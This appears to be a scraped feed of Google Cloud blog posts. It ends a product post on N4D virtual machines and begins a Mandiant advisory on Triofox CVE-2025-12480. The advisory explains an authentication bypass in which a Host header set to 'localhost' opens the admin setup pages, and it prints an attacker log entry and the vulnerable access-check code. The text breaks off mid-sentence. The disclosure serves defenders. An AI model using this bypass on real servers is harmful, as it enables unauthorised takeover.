src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/1_2hTLTQA.max-1000x1000.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>As of October 2025. Performance based on the estimated SPECrate\u00ae2017_int_base, estimated SPECjbb2015, and Google internal Nginx Reverse Proxy benchmark scores run in production. Price-performance claims based on published and estimated list prices for Google Cloud.</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_with_image\"><div class=\"article-module h-c-page\">\n  <div class=\"h-c-grid uni-paragraph-wrap\">\n    <div class=\"uni-paragraph\n      h-c-grid__col h-c-grid__col--8 h-c-grid__col-m--6 h-c-grid__col-l--6\n      h-c-grid__col--offset-2 h-c-grid__col-m--offset-3 h-c-grid__col-l--offset-3\">\n\n      \n\n\n\n\n\n\n  \n\n    <figure class=\"article-image--wrap-small\n      \n      \">\n\n      \n      \n        \n        <img alt=\"Chronosphere\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/Chronosphere.max-1000x1000.jpg\" />\n        \n        </a>\n      \n    </figure>\n\n  \n\n\n\n\n\n      <p><i>\u201cOur edge proxy fleet and internal data pipelines observed a</i> <b><i>3-4x performance improvemen</i></b><i>t on Google Cloud's N4D instances compared to N2D. Our benchmarks also show N4D processes the same workload with significantly greater consistency while using just a fraction of the CPU. This leap in price-performance allows us to efficiently scale our general-purpose workloads, and fits neatly in our fleet alongside more specific Google compute products we leverage.\u201d</i> - Matt Schallert, Member of Technical Staff, Chronosphere</p>\n    </div>\n  </div>\n</div>\n\n</div>\n<div class=\"block-paragraph_with_image\"><div class=\"article-module h-c-page\">\n  <div class=\"h-c-grid uni-paragraph-wrap\">\n    <div class=\"uni-paragraph\n      h-c-grid__col h-c-grid__col--8 h-c-grid__col-m--6 h-c-grid__col-l--6\n      h-c-grid__col--offset-2 h-c-grid__col-m--offset-3 h-c-grid__col-l--offset-3\">\n\n      \n\n\n\n\n\n\n  \n\n    <figure class=\"article-image--wrap-small\n      \n      \">\n\n      \n      \n        \n        <img alt=\"MediaGo\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/MediaGo.max-1000x1000.jpg\" />\n        \n        </a>\n      \n    </figure>\n\n  \n\n\n\n\n\n      <p><i>\u201cA</i> <b><i>10% increase in throughput while cutting costs by up to 50%</i></b><i> is a massive win for TCO optimization. That's what we achieved on Google Cloud's N4D machine series. For MediaGo, this efficiency is critical. It allows our AI-driven advertising platform to scale more cost-effectively, directly supporting our mission to maximize ROI for our global partners.\u201d</i> - MediaGo</p>\n    </div>\n  </div>\n</div>\n\n</div>\n<div class=\"block-paragraph_with_image\"><div class=\"article-module h-c-page\">\n  <div class=\"h-c-grid uni-paragraph-wrap\">\n    <div class=\"uni-paragraph\n      h-c-grid__col h-c-grid__col--8 h-c-grid__col-m--6 h-c-grid__col-l--6\n      h-c-grid__col--offset-2 h-c-grid__col-m--offset-3 h-c-grid__col-l--offset-3\">\n\n      \n\n\n\n\n\n\n  \n\n    <figure class=\"article-image--wrap-small\n      \n      \">\n\n      \n      \n        \n        <img alt=\"phoronix\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/phoronix.max-1000x1000.jpg\" />\n        \n        </a>\n      \n    </figure>\n\n  \n\n\n\n\n\n      <p><i>\"The move from N2D to N4D is a significant generational leap. This</i><b><i> 144.14% performance uplift over 152 tests</i></b><i> is a testament to Google's Titanium, unlocking the full potential of the new AMD EPYC 'Turin' processors. For those looking for the best possible price-performance in Google Cloud, the N4D instances are a clear winner.\"</i> - Michael Larabel, Founder and Principal Author, Phoronix (Read the full study <a href=\"https://www.phoronix.com/review/google-cloud-n4d-amd-epyc-turin\">here</a>.)</p>\n    </div>\n  </div>\n</div>\n\n</div>\n<div class=\"block-paragraph_with_image\"><div class=\"article-module h-c-page\">\n  <div class=\"h-c-grid uni-paragraph-wrap\">\n    <div class=\"uni-paragraph\n      h-c-grid__col h-c-grid__col--8 h-c-grid__col-m--6 h-c-grid__col-l--6\n      h-c-grid__col--offset-2 h-c-grid__col-m--offset-3 h-c-grid__col-l--offset-3\">\n\n      \n\n\n\n\n\n\n  \n\n    <figure class=\"article-image--wrap-small\n      \n      \">\n\n      \n      \n        \n        <img alt=\"amd\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/amd_LIvoHWP.max-1000x1000.jpg\" />\n        \n        </a>\n      \n    </figure>\n\n  \n\n\n\n\n\n      <p><i>\"With the launch of the new N4D instances, Google Cloud now offers</i> <b><i>the most comprehensive portfolio based on our 5th Gen AMD EPYC processors</i></b><i>, marking a significant milestone in our strategic partnership. N4D machine series combines the leading performance of AMD CPUs with the uniqueness of Google's Custom Machine Types to deliver a remarkable uplift in price-performance, flexibility, and cost-optimization for everyday workloads. Our benchmark tests confirm this, showing measured performance gains of up to 75% over the previous generation N2D machine series for media encode and transcode workloads.\"</i> \u2013 Ryan Rodman, Sr Director, Cloud Business Group, AMD</p>\n    </div>\n  </div>\n</div>\n\n</div>\n<div class=\"block-paragraph_advanced\"><h3><strong style=\"vertical-align: baseline;\">Complementing C4D machine series</strong></h3>\n<p><span style=\"vertical-align: baseline;\">Earlier this year, we introduced our general-purpose </span><a href=\"https://cloud.google.com/blog/products/compute/c4d-vms-unparalleled-performance-for-business-workloads\"><span style=\"text-decoration: underline; vertical-align: baseline;\">C4D machine series</span></a><span style=\"vertical-align: baseline;\"> built on the same underlying processor as N4D. Its consistently high performance and enterprise features like advanced maintenance support, larger shapes, and our next-gen Titanium Local SSDs, make C4D a great fit for critical workloads. In fact, customers such as </span><a href=\"https://cloud.google.com/blog/products/compute/c4d-vms-unparalleled-performance-for-business-workloads?e=48754805#:~:text=%E2%80%9CSilk%20has%20tested,D%20Officer%2C%20Silk\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Silk</span></a><span style=\"vertical-align: baseline;\"> and </span><a href=\"https://cloud.google.com/blog/products/compute/c4d-vms-unparalleled-performance-for-business-workloads?e=48754805#:~:text=%22We%20are%20constantly,Engineer%2C%20Chess.com\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Chess.com</span></a><span style=\"vertical-align: baseline;\"> report greater than 40% improvement in performance with C4D over prior generations. </span></p>\n<p><span style=\"vertical-align: baseline;\">But critical applications are only part of the story. A modern cloud architecture must also run countless general-purpose workloads where flexibility and price-performance are key. That\u2019s why we designed N4D \u2014 as a complement to C4D. By leveraging C4D and N4D in tandem, you unlock the full spectrum of enterprise features, performance, flexibility, and cost-optimization, choosing:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">C4D for consistent performance:</strong><span style=\"vertical-align: baseline;\"> This is your solution for the most demanding, latency-sensitive applications. With up to 200 Gbps networking, Local SSD support along with larger shapes up to 384 vCPUs and bare metal options, C4D delivers predictable, high-end performance for large databases, high-traffic ad and game servers, and demanding AI/ML inference workloads.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">N4D for flexible cost-optimization:</strong><span style=\"vertical-align: baseline;\"> This is the engine for the vast majority of your general-purpose workloads. N4D\u2019s leading price-performance, low cost, and flexibility allow you to slash TCO for applications like web servers, microservices, and development environments.</span></p>\n</li>\n</ul>\n<p><span style=\"vertical-align: baseline;\">This approach is already delivering real-world results, allowing customers like Verve to optimize their business from both ends.</span></p></div>\n<div class=\"block-paragraph_with_image\"><div class=\"article-module h-c-page\">\n  <div class=\"h-c-grid uni-paragraph-wrap\">\n    <div class=\"uni-paragraph\n      h-c-grid__col h-c-grid__col--8 h-c-grid__col-m--6 h-c-grid__col-l--6\n      h-c-grid__col--offset-2 h-c-grid__col-m--offset-3 h-c-grid__col-l--offset-3\">\n\n      \n\n\n\n\n\n\n  \n\n    <figure class=\"article-image--wrap-small\n      \n      \">\n\n      \n      \n        \n        <img alt=\"verve\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/verve.max-1000x1000.jpg\" />\n        \n        </a>\n      \n    </figure>\n\n  \n\n\n\n\n\n      <p>\"<i>With Google's Gen4 AMD portfolio, we can optimize for both revenue and cost simultaneously.</i> <b><i>C4D provides the consistent peak performance we need for our core ad servers</i></b> <i>\u2014 81% faster than C3D \u2014 which directly translates to more revenue from higher fill-rates (successful bid/ask matching). Meanwhile,</i> <b><i>N4D delivers an incredible 2x performance and price-performance over N2D for everyday workloads</i></b><i>, including scale-out microservices with GKE, enabling us to grow while slashing our overall TCO. This 'Better Together' strategy allows us to use the consistently peak performance of C4D for our mission-critical services and the flexible, cost-efficient N4D to aggressively reduce TCO everywhere else \u2014 a level of optimization that simply isn't possible with a single VM type elsewhere.\u201d -</i> Pablo Loschi, Principal Systems Engineer at Verve</p>\n    </div>\n  </div>\n</div>\n\n</div>\n<div class=\"block-paragraph_advanced\"><h3><strong style=\"vertical-align: baseline;\">The Custom Machine Type and Hyperdisk advantage</strong></h3>\n<p><span style=\"vertical-align: baseline;\">Custom Machine Types are a key differentiator for Google Cloud, letting you go beyond predefined \"T-shirt sizes\". Instead of forcing your workload into a box, you can tailor the infrastructure to fit your workload's needs, saving on cost. For instance, a memory-intensive workload requiring 16 vCPUs and 70 GB of RAM might typically be placed on a predefined N4D-highmem-16 shape, forcing you to pay for unused resources. With CMTs, you provision the exact 16 vCPU and 70 GB configuration, eliminating that waste and achieving up to </span><strong style=\"vertical-align: baseline;\">17% cost savings</strong><span style=\"vertical-align: baseline;\">.\u00a0</span></p>\n<p><span style=\"vertical-align: baseline;\">With shapes of up to 96 vCPUs and 768 GB of DDR5 memory, the combination of Custom Machine Types and N4D lets you dial in the exact resources you need with flexible vCPU-to-memory ratios along with extended memory support. </span></p></div>\n<div class=\"block-paragraph_with_image\"><div class=\"article-module h-c-page\">\n  <div class=\"h-c-grid uni-paragraph-wrap\">\n    <div class=\"uni-paragraph\n      h-c-grid__col h-c-grid__col--8 h-c-grid__col-m--6 h-c-grid__col-l--6\n      h-c-grid__col--offset-2 h-c-grid__col-m--offset-3 h-c-grid__col-l--offset-3\">\n\n      \n\n\n\n\n\n\n  \n\n    <figure class=\"article-image--wrap-small\n      \n      \">\n\n      \n      \n        \n        <img alt=\"symbotic\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/symbotic.max-1000x1000.jpg\" />\n        \n        </a>\n      \n    </figure>\n\n  \n\n\n\n\n\n      <p><i>\u201cAt Symbotic, our vision is to revolutionize the global supply chain with an AI-powered robotics platform built for scale and efficiency. This demands an infrastructure that is both powerful and scalable. Google Cloud's N4D VMs, powered by AMD's latest EPYC processors, delivered exactly that. We observed a</i> <b><i>significant 40% performance uplift</i></b> <i>compared to the previous N2D generation, allowing us to cut</i><b><i> our CPU footprint in half</i></b> <i>with no change in simulation speed or fidelity.</i> <i>The ability to pair these gains with Custom Machine Types</i> <i>\u2014 a capability unique to Google Cloud \u2014 is a game-changer. It allows us to</i> <b><i>precisely sculpt our infrastructure to our workloads</i></b><i> and gain a significant TCO advantage versus other cloud offerings.\u201d</i> - Dan Inbar, Chief Information Officer, Symbotic</p>\n    </div>\n  </div>\n</div>\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">This granular control and TCO advantage extends beyond compute to your storage. Just as Custom Machine Types let you break free from fixed vCPU-to-memory ratios, </span><a href=\"https://cloud.google.com/compute/docs/disks/hyperdisks\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Hyperdisk</span></a><span style=\"vertical-align: baseline;\"> unbundles storage performance from capacity, letting you independently tune capacity and performance to precisely match your workload\u2019s block storage requirements.</span></p>\n<p><span style=\"vertical-align: baseline;\">This is further enhanced by </span><a href=\"https://cloud.google.com/blog/products/storage-data-transfer/hyperdisk-storage-pools-is-now-generally-available\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Hyperdisk Storage Pools</span></a><span style=\"vertical-align: baseline;\"> for Hyperdisk Balanced volumes, which let you provision performance and capacity in aggregate, rather than managing each volume individually. The result is simpler management, higher efficiency, an easier path for modernizing SAN workloads \u2014 all this while helping you lower your storage TCO by as much as </span><a href=\"https://cloud.google.com/blog/products/storage-data-transfer/hyperdisk-storage-pools-is-now-generally-available?e=48754805\"><span style=\"text-decoration: underline; vertical-align: baseline;\">30-50%</span></a><span style=\"vertical-align: baseline;\">.</span></p>\n<h3><strong style=\"vertical-align: baseline;\">Get started with N4D today</strong></h3>\n<p><span style=\"vertical-align: baseline;\">Adopting the latest N4D VM series is easy, particularly if you use </span><a href=\"https://cloud.google.com/kubernetes-engine\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Google Kubernetes Engine (GKE)</span></a><span style=\"vertical-align: baseline;\">, where our </span><a href=\"https://cloud.google.com/blog/products/compute/adopt-new-vm-series-with-gke-compute-classes-flexible-cuds?e=48754805\"><span style=\"text-decoration: underline; vertical-align: baseline;\">custom compute classes</span></a><span style=\"vertical-align: baseline;\"> remove the operational hurdles of migrating workloads to new hardware. Just add N4D to your prioritized list of VM types to ensure your workloads have the performance and flexibility they need to scale.</span></p>\n<p><span style=\"vertical-align: baseline;\">N4D is now available in us-central1 (Iowa), us-east1 (South Carolina), us-west1 (Oregon), us-west4 (Las Vegas), europe-west1 (Belgium), and europe-west4 (Netherlands).\u00a0</span></p>\n<p><span style=\"vertical-align: baseline;\">Check for the latest availability on our</span> <a href=\"https://cloud.google.com/compute/docs/regions-zones#available\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Regions and Zones page</span></a><span style=\"vertical-align: baseline;\"> and deploy your first instance today in the </span><a href=\"https://console.cloud.google.com/\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Google Cloud console</span></a><span style=\"vertical-align: baseline;\"> or with GKE. Learn more about N4D details here in </span><a href=\"https://docs.cloud.google.com/compute/docs/general-purpose-machines#n4d_series\"><span style=\"text-decoration: underline; vertical-align: baseline;\">documentation</span></a><span style=\"vertical-align: baseline;\">.</span></p>\n<hr />\n<p><sup><em><span style=\"vertical-align: baseline;\">1. 9xx5C-044 - Testing by AMD Performance Labs as of 10/21/2025. N4D-standard-16 score comparison to N2D-standard-16 running FFmpeg v6.1.1 benchmark (average of 2x encode and 2x transcode) on Ubuntu24.04LTS OS with 6.8.0-1021-gcp kernel, SMT On.</span></em></sup></p>\n<p><sup><em><span style=\"vertical-align: baseline;\">Performance uplift (normalized to N2D):</span></em></sup></p>\n<p><sup><em><span style=\"vertical-align: baseline;\">Ffmpeg_raw_vp9</span><span style=\"vertical-align: baseline;\"> </span><span style=\"vertical-align: baseline;\">\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 1.76<br /></span></em></sup><sup><em><span style=\"vertical-align: baseline;\">Ffmpeg_h264_vp9</span><span style=\"vertical-align: baseline;\"> </span><span style=\"vertical-align: baseline;\">\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a01.76<br /></span></em></sup><sup><em><span style=\"vertical-align: baseline;\">Ffmpeg_raw_h264</span><span style=\"vertical-align: baseline;\"> </span><span style=\"vertical-align: baseline;\">\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a01.71<br /></span></em></sup><sup><em><span style=\"vertical-align: baseline;\">Ffmpeg_vp9_h264</span><span style=\"vertical-align: baseline;\"> </span><span style=\"vertical-align: baseline;\">\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a01.76<br /></span></em></sup><sup><em><span style=\"vertical-align: baseline;\">FFmpeg average</span><span style=\"vertical-align: baseline;\"> </span><span style=\"vertical-align: baseline;\">\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 1.75</span></em></sup></p>\n<p><sup><em><span style=\"vertical-align: baseline;\">Cloud performance results presented are based on the test date in the configuration. Results may vary due to changes to the underlying configuration, and other conditions such as the placement of the VM and its resources, optimizations by the cloud service provider, accessed cloud regions, co-tenants, and the types of other workloads exercised at the same time on the system</span></em></sup></p></div>",
        "published_date": "2025-11-10 17:00:00"
    },
    {
        "website": "GOOGLE_CLOUD_BLOG",
        "link": "https://cloud.google.com/blog/topics/threat-intelligence/triofox-vulnerability-cve-2025-12480/",
        "title": "No Place Like Localhost: Unauthenticated Remote Access via Triofox Vulnerability CVE-2025-12480",
        "thumbnail": null,
        "author": "Mandiant",
        "track": null,
        "description": "<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">Written by: Stallone D'Souza, Praveeth DSouza, Bill Glynn, Kevin O'Flynn, Yash Gupta</span></p>\n<hr /></div>\n<div class=\"block-paragraph_advanced\"><h3 style=\"text-align: justify;\"><span style=\"vertical-align: baseline;\">Welcome to the Frontline Bulletin Series</span></h3>\n<p><span style=\"vertical-align: baseline;\">Straight from Mandiant Threat Defense, the \"Frontline Bulletin\" series brings you the latest on the threats we are seeing in the wild right now, equipping our community to understand and respond.\u00a0</span></p>\n<h3 style=\"text-align: justify;\"><span style=\"vertical-align: baseline;\">Introduction</span></h3>\n<p><a href=\"https://cloud.google.com/security/products/mandiant-managed-threat-hunting\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Mandiant Threat Defense</span></a><span style=\"vertical-align: baseline;\">\u00a0has uncovered exploitation of </span><span style=\"vertical-align: baseline;\">an unauthenticated access vulnerability within Gladinet\u2019s Triofox file-sharing and remote access platform. This now-patched n-day vulnerability, assigned </span><a href=\"https://www.cve.org/CVERecord?id=CVE-2025-12480\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">CVE-2025-12480</span></a><span style=\"vertical-align: baseline;\">, allowed an attacker to bypass authentication and access the application configuration pages, enabling the upload and execution of arbitrary payloads.\u00a0</span></p>\n<p><span style=\"vertical-align: baseline;\">As early as Aug. 24, 2025, a threat cluster tracked by Google Threat Intelligence Group (GTIG) as UNC6485 exploited the unauthenticated access vulnerability and chained it with the abuse of the built-in anti-virus feature to achieve code execution.\u00a0</span></p>\n<p><span style=\"vertical-align: baseline;\">The activity discussed in this blog post leveraged a vulnerability in Triofox version 16.4.10317.56372, which was mitigated in release </span><a href=\"https://access.triofox.com/releases_history/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">16.7.10368.56560</span></a><span style=\"vertical-align: baseline;\">.</span></p>\n<p><span style=\"vertical-align: baseline;\">Gladinet engaged with Mandiant on our findings, and Mandiant has validated that this vulnerability is resolved in new versions of Triofox</span><span style=\"vertical-align: baseline;\">.</span></p>\n<h3><span style=\"vertical-align: baseline;\">Initial Detection</span></h3>\n<p><span style=\"vertical-align: baseline;\">Mandiant leverages </span><a href=\"https://cloud.google.com/security/products/security-operations\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Google Security Operations</span></a><span style=\"vertical-align: baseline;\"> (SecOps) for detecting, investigating, and responding to security incidents across our customer base. As part of </span><a href=\"https://cloud.google.com/security/shared-fate\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Google Cloud Security\u2019s Shared Fate</span></a><span style=\"vertical-align: baseline;\"> model, SecOps provides out-of-the-box detection content designed to help customers identify threats to their enterprise. Mandiant uses SecOps\u2019 composite detection functionality to enhance our detection posture by correlating the outputs from multiple rules.</span></p>\n<p><span style=\"vertical-align: baseline;\">For this investigation, Mandiant received a composite detection alert identifying potential threat actor activity on a customer's Triofox server. The alert identified the deployment and use of remote access utilities (using PLINK to tunnel RDP externally) and file activity in potential staging directories (file downloads to </span><code style=\"vertical-align: baseline;\">C:\\WINDOWS\\Temp</code><span style=\"vertical-align: baseline;\">).</span></p>\n<p><span style=\"vertical-align: baseline;\">Within 16 minutes of beginning the investigation, Mandiant confirmed the threat and initiated containment of the host. The investigation revealed an unauthenticated access vulnerability that allowed access to configuration pages. UNC6485 used these pages to run the initial Triofox setup process to create a new native admin account, </span><code style=\"vertical-align: baseline;\">Cluster Admin</code><span style=\"vertical-align: baseline;\">, and used this account to conduct subsequent activities.</span></p>\n<h3><span style=\"vertical-align: baseline;\">Triofox Unauthenticated Access Control Vulnerability</span></h3></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"CVE-2025-12480 exploitation chain\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/triofox-vulnerability-fig1.max-1000x1000.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Figure 1: CVE-2025-12480 exploitation chain</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">During the Mandiant investigation, we identified an anomalous entry in the HTTP log file - a suspicious HTTP GET request with an HTTP Referer URL containing </span><code style=\"vertical-align: baseline;\">localhost</code><span style=\"vertical-align: baseline;\">. The presence of the </span><code style=\"vertical-align: baseline;\">localhost</code><span style=\"vertical-align: baseline;\"> host header in a request originating from an external source is highly irregular and typically not expected in legitimate traffic.</span></p></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-plain\"><code>GET /management/CommitPage.aspx - 443 - 85.239.63[.]37 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/101.0.4951.41+Safari/537.36 http://localhost/management/AdminAccount.aspx 302 0 0 56041</code></pre>\n<p style=\"text-align: center;\"><span style=\"color: #5f6368; display: block; font-size: 16px; font-style: italic; margin-top: 8px; width: 100%;\"><span style=\"vertical-align: baseline;\">Figure 2: HTTP log entry</span></span></p></div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">Within a test environment, Mandiant noted that standard HTTP requests issued to </span><code style=\"vertical-align: baseline;\">AdminAccount.aspx</code><span style=\"vertical-align: baseline;\"> result in a redirect to the Access Denied page, indicative of access controls being in place on the page.</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"Redirection to AccessDenied.aspx when attempting to browse AdminAccount.aspx\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/triofox-vulnerability-fig3.max-1000x1000.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Figure 3: Redirection to AccessDenied.aspx when attempting to browse AdminAccount.aspx</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">Access to the </span><code style=\"vertical-align: baseline;\">AdminAccount.aspx</code><span style=\"vertical-align: baseline;\"> page is granted as part of setup from the initial configuration page at </span><code style=\"vertical-align: baseline;\">AdminDatabase.aspx</code><span style=\"vertical-align: baseline;\">. The </span><code style=\"vertical-align: baseline;\">AdminDatabase.aspx</code><span style=\"vertical-align: baseline;\"> page is automatically launched after first installing the Triofox software. This page allows the user to set up the Triofox instance, with options such as database selection (Postgres or MySQL), connecting LDAP accounts, or creating a new native cluster admin account, in addition to other details.</span></p>\n<p><span style=\"vertical-align: baseline;\">Attempts to browse to the </span><code style=\"vertical-align: baseline;\">AdminDatabase.aspx</code><span style=\"vertical-align: baseline;\"> page resulted in a similar redirect to the Access Denied page.</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"Redirection to AccessDenied.aspx when attempting to browse AdminDatabase.aspx\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/triofox-vulnerability-fig4.max-1000x1000.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Figure 4: Redirection to AccessDenied.aspx when attempting to browse AdminDatabase.aspx</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">Mandiant validated the vulnerability by testing the workflow of the setup process.\u00a0</span><span style=\"vertical-align: baseline;\">The Host header field is provided by the web client and can be easily modified by an attacker. This technique is referred to as an HTTP host header attack. Changing the </span><code style=\"vertical-align: baseline;\">Host</code><span style=\"vertical-align: baseline;\"> value to </span><code style=\"vertical-align: baseline;\">localhost</code><span style=\"vertical-align: baseline;\"> grants access to the </span><code style=\"vertical-align: baseline;\">AdminDatabase.aspx</code><span style=\"vertical-align: baseline;\"> page.</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"Access granted to AdminDatabase.aspx by changing Host header to localhost\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/triofox-vulnerability-fig5.max-1000x1000.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Figure 5: Access granted to AdminDatabase.aspx by changing Host header to localhost</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">By following the setup process and creating a new database via the </span><code style=\"vertical-align: baseline;\">AdminDatabase.aspx</code><span style=\"vertical-align: baseline;\"> page, access is granted to the admin initialization page, </span><code style=\"vertical-align: baseline;\">AdminAccount.aspx</code><span style=\"vertical-align: baseline;\">, which then redirects to the </span><code style=\"vertical-align: baseline;\">InitAccount.aspx</code><span style=\"vertical-align: baseline;\"> page to create a new admin account.</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"Successful access to the AdminCreation page InitAccount.aspx\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/triofox-vulnerability-fig6.max-1000x1000.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Figure 6: Successful access to the AdminCreation page InitAccount.aspx</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"Admin page\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/triofox-vulnerability-fig7a.max-1000x1000.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Figure 7: Admin page</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">Analysis of the code base revealed that the main access control check to the </span><code style=\"vertical-align: baseline;\">AdminDatabase.aspx</code><span style=\"vertical-align: baseline;\"> page is controlled by the function </span><code style=\"vertical-align: baseline;\">CanRunCrticalPage()</code><span style=\"vertical-align: baseline;\">,\u00a0 located within the </span><code style=\"vertical-align: baseline;\">GladPageUILib.GladBasePage</code><span style=\"vertical-align: baseline;\"> class found in </span><code style=\"vertical-align: baseline;\">C:\\Program Files (x86)\\Triofox\\portal\\bin\\GladPageUILib.dll</code><span style=\"vertical-align: baseline;\">.</span></p></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-plain\"><code>public bool CanRunCriticalPage()\n{\n    Uri url = base.Request.Url;\n    string host = url.Host;\n    bool flag = string.Compare(host, \"localhost\", true) == 0; //Access to the page is granted if Request.Url.Host equals 'localhost', immediately skipping all other checks if true\n\n    bool result;\n    if (flag)\n    {\n        result = true;\n    }\n    else\n    {\n       //Check for a pre-configured trusted IP in the web.config file. If configured, compare the client IP with the trusted IP to grant access\n \nstring text = ConfigurationManager.AppSettings[\"TrustedHostIp\"];\n        bool flag2 = string.IsNullOrEmpty(text);\n        if (flag2)\n        {\n            result = false;\n        }\n        else\n        {\n            string ipaddress = this.GetIPAddress();\n            bool flag3 = string.IsNullOrEmpty(ipaddress);\n            if (flag3)\n            {\n                result = false;\n            }\n            else\n            ...\n           </code></pre>\n<p style=\"text-align: center;\"><span style=\"color: #5f6368; display: block; font-size: 16px; font-style: italic; margin-top: 8px; width: 100%;\">Figure 8: Vulnerable code in the function <code>CanRunCrticalPage()</code></span>\u00a0</p></div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">As noted in the code snippet, the code presents several vulnerabilities:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Host Header attack - ASP.NET builds </span><code style=\"vertical-align: baseline;\">Request.Url</code><span style=\"vertical-align: baseline;\"> </span><span style=\"vertical-align: baseline;\">from the HTTP Host header, which can be modified by an 